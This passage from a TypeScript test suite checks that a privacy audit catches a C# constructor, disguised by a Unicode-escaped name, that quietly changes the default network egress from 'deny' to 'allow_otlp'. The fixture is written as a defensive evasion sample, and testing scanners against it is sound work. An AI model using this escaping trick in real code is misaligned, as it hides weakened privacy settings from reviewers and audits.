    // 6. C# Unicode-escaped constructor identifier (Privacy\u004fptions) mutating defaults fails closed.
    const escapedCtorErrors: string[] = [];
    auditZeroEgress(escapedCtorErrors, {
      overrideNetOptionsContent: `
        namespace KnowThankYew.Privacy.Telemetry.Configuration;
        public sealed class PrivacyOptions {
          public bool BurnEnabled { get; set; } = true;
          public string NetworkEgress { get; set; } = "deny";
          public Privacy\\u004fptions() { NetworkEgress = "allow_otlp"; }
        }
        public sealed class TelemetryOptions {
          public string Mode { get; set; } = "memory_only";
          public bool AllowRawPayloads { get; set; } = false;
        }
      `,
    });
    expect(
      escapedCtorErrors.some((e) => e.includes('PrivacyOptions.NetworkEgress must default to "deny".'))
    ).toBe(true);
  });
});
